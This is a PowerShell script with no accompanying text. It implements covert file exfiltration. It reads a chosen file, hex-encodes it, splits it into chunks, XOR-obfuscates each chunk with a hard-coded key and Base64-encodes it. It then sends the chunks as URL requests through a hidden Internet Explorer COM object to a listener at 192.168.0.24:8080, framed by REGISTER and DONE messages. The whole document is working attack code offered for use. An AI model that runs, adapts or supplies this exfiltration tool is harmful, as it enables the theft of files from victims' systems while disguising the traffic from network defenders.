function Send-HTTPRequest {
    param ([string] $data, [System.__ComObject] $IE)
    $url = 'http://192.168.0.24:8080/';
    $data = Xor $data;
    $data = Base64 $data;
    $IE.navigate2($url+$data)
    Start-Sleep -s 2;
};

function HTTP-exfil {
    param ([string] $file)
    $bytes = [System.IO.File]::ReadAllBytes($file)
    
    $md5 = New-Object -TypeName System.Security.Cryptography.MD5CryptoServiceProvider
    $hash = [System.BitConverter]::ToString($md5.ComputeHash($bytes))
    $IE = new-object -com internetexplorer.application;
    $data = [System.IO.File]::ReadAllBytes($file);
    $string = [System.BitConverter]::ToString($data);
    $string = $string -replace '-','';
    
    $hash = $hash -replace '-','';
    $filename = Split-Path $file -leaf
    $len = $string.Length;
    #$split = Get-Random -minimum 1 -maximum 250;
    $split = 300
    $id = 0
    $repeat=[Math]::Ceiling($len/$split);
    $remainder=$len%$split;
    $jobid = [System.Guid]::NewGuid().toString().Substring(0, 7)
    $data = $jobid + '|!|' + $filename + '|!|REGISTER|!|' + $hash 
    $q = Send-HTTPRequest $data $IE
    for($i=0; $i-lt$repeat-1; $i++){
        $str = $string.Substring($i * $Split, $Split);
        $data = $jobid + '|!|' + $i + '|!|' + $str
        echo $i
        echo $split
        echo $str
        $q = Send-HTTPRequest $data $IE
    };
    if($remainder){
        echo $string
        $str = $string.Substring($len-$remainder);
        $i = $i +1
        $data = $jobid + '|!|' + $i + '|!|' + $str
        $q = Send-HTTPRequest $data $IE
    };
    
    $i = $i + 1
    $data = $jobid + '|!|' + $i + '|!|DONE'
    $q = Send-HTTPRequest $data $IE
};

function Base64 {
    param ([string] $data)
    $Bytes = [System.Text.Encoding]::ASCII.GetBytes($data)
    return [Convert]::ToBase64String($Bytes)    
}

function Xor {
    param ([string] $data)  
    $enc = [system.Text.Encoding]::UTF8
    $bytes = $enc.GetBytes($data)
    $key = "THISISACRAZYKEY"
    for($i=0; $i -lt $bytes.count ; $i++)
    {
        $bytes[$i] = $bytes[$i] -bxor $key[$i%$key.Length]
    }
    return [System.Text.Encoding]::ASCII.GetString($bytes)
}

function Convert-ToCHexString {
    param ([String] $str) 
    $ans = ''
    [System.Text.Encoding]::ASCII.GetBytes($str) | % { $ans += "{0:X2}" -f $_ }
    return $ans;
}